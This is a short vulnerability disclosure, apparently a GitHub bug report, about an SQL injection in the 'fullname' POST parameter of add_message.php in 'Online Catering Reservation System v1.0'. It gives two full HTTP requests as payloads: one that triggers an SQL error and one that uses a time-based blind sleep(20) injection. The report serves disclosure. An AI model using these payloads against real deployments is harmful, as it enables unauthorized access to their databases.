# Online Catering Reservation System v1.0 has SQL injection

BUG_Author:jackswordsz

Vulnerability File: /reservation/add_message.php

POST parameter 'fullname' exists SQL injection vulnerability

Payload1:fullname=1'&email=2%40gmail.com&subject=3&message=4

```
POST /reservation/add_message.php HTTP/1.1
Host: localhost
Content-Length: 51
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/reservation/contact.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=02qotonqdgu64aj0uljkiarmul
Connection: close

fullname=1'&email=2%40gmail.com&subject=3&message=4
```

An error occurred in the sql statement

![image](https://github.com/jackswordsz/bug_report/blob/main/picture/jackswordsz1.png)

Payload2:fullname=1' and (select 1 from (select(sleep(20)))b) and 'a'='a&email=2%40gmail.com&subject=3&message=4

```
POST /reservation/add_message.php HTTP/1.1
Host: localhost
Content-Length: 103
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/reservation/contact.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=02qotonqdgu64aj0uljkiarmul
Connection: close

fullname=1' and (select 1 from (select(sleep(20)))b) and 'a'='a&email=2%40gmail.com&subject=3&message=4
```

The server's response time is 20 seconds

![image](https://github.com/jackswordsz/bug_report/blob/main/picture/jackswordsz2.png)
